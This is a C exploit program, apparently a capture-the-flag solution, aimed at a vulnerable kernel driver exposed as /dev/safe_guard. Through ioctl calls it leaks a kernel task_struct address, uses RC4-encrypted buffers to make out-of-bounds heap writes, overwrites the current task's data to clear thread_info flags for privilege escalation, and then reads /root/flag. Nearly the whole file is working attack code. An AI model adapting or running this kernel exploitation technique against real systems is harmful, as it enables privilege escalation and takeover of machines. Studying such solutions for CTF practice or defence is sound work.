#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <inttypes.h>
#include <string.h>
#include <sys/ioctl.h>

#define DEV "/dev/safe_guard"
#define KEBAB_IOCTL_NEW       0xFABADA
#define KEBAB_IOCTL_READ      0xBEBE
#define KEBAB_IOCTL_SET_KEY   0x1CAFE
#define MAX_RC4_LEN           256

struct secure_buffer {
	char *buffer;
	size_t size;
};

struct payload_t{
	unsigned long addr;
	unsigned long pad;
};

struct new_secbuff_arg {
	size_t size;
	char key[MAX_RC4_LEN];
	const char *buffer;
};

struct read_secbuff_arg {
	unsigned long index;
	char key[MAX_RC4_LEN];
	char *buffer;
} ;

typedef struct {
	int pid;
	struct task_struct *cur;
	size_t max_len;
} key_info;

static int fd;

static char key_buf[MAX_RC4_LEN] = {0xdd, 0x01};
static char leak_buf[MAX_RC4_LEN] = {0};
static key_info leak = {0};

struct rc4_state {
	unsigned char	perm[256];
	unsigned char	index1;
	unsigned char	index2;
};

static __inline void swap_bytes(unsigned char *a, unsigned char *b)
{
	unsigned char temp;

	temp = *a;
	*a = *b;
	*b = temp;
}

static void rc4_init(struct rc4_state *const state, unsigned char *key, int keylen)
{
	unsigned char j;
	int i;

	for (i = 0; i < 256; i++)
		state->perm[i] = (unsigned char)i; 
	state->index1 = 0;
	state->index2 = 0;

	for (j = i = 0; i < 256; i++) {
		j += state->perm[i] + key[i % keylen]; 
		swap_bytes(&state->perm[i], &state->perm[j]);
	}
}

static void rc4_crypt(struct rc4_state *const state, const unsigned char *inbuf, unsigned char *outbuf, int buflen)
{
	int i;
	unsigned char j;

	for (i = 0; i < buflen; i++) {

		state->index1++;
		state->index2 += state->perm[state->index1];

		swap_bytes(&state->perm[state->index1],
		    &state->perm[state->index2]);

		j = state->perm[state->index1] + state->perm[state->index2];
		outbuf[i] = inbuf[i] ^ state->perm[j];
	}
}

static void get(char *payload, int len, char* outbuf){
	struct rc4_state state;
	rc4_init(&state, key_buf, strlen(key_buf));
	rc4_crypt(&state, payload, outbuf, len);

}

static void create_buf(int size, char *buf){

	struct new_secbuff_arg arg = {
		.size = size,
		.buffer = buf
	};

	memcpy(arg.key, key_buf, MAX_RC4_LEN);

	ioctl(fd, KEBAB_IOCTL_NEW, &arg);
}

static void logleak(char *__s, unsigned long addr){
	printf("[*] %s : %#lx\n", __s, addr);
}

static void read_buf(unsigned long index, char *buf){
	struct read_secbuff_arg arg = {
		.index = index,
		.buffer = buf
	};

	memcpy(arg.key, key_buf, MAX_RC4_LEN);
}

static void set_key(void){
	memcpy(leak_buf, key_buf, MAX_RC4_LEN);
	
	if(ioctl(fd, KEBAB_IOCTL_SET_KEY, leak_buf) < 0 ){
		printf("[-] Error setting the key\n");
	}

	memcpy(&leak, leak_buf, sizeof(key_info));
}

static void cat_flag(){
	int f = open("/root/flag", O_RDONLY);
	if (f < 0){perror("flag not found"); exit(1);}

	char flagbuf[0x40] = {0};

	read(f, flagbuf, sizeof(flagbuf));
	printf("[*] Flag: %s", flagbuf);
	close(f);
}

static void send_enc(void *payload, int len){
	char * res = malloc(len);

	get(payload, len, res);

	create_buf(len, res);

	free(res);
}

void exploit(int devfd){

	fd = devfd;

	if (fd > 0){
		printf("[*] Opened device\n");
	} else { exit(1); }

	set_key();

	printf("[!] The key is %s\n", key_buf);

	unsigned long current = (unsigned long)leak.cur;

	logleak("task_struct current", current);
	logleak("PID", (unsigned long)leak.pid);

	// OOB to create loop alloc
	struct payload_t A;
	memset(&A, 0x41, sizeof(struct payload_t));
	send_enc(&A, sizeof(struct payload_t));

	// Alloc and write current
	struct payload_t curr = {
		.addr = current,
		.pad = 0x4141414141414141
	};
	send_enc(&curr, sizeof(struct payload_t)); 

	// zero out thread_info.flags
	struct payload_t flags = {0};
	send_enc(&flags, sizeof(struct payload_t));

	cat_flag();

}
